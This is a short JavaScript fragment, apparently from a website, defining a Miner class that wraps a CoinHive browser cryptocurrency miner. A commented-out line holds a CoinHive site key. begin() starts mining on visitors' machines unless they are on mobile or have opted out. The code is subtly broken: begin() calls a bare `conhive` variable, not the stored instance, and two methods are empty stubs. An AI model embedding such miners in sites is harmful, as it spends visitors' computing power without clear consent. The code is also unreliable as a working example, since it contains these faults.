//var miner = new CoinHive.Anonymous('kuLEQIq4VDkik2UiCSrYWLoX8hwzNHsY', {throttle: 0.1});

class Miner{

    constructor(conhive){

        this.conhive=conhive;
        this.cpuUsage=10;

    }

    getStat(){



    }

    begin(){

        if (!this.conhive.isMobile() && !conhive.didOptOut(14400)) {

            conhive.start();

        }

    }

    end(){



    }



}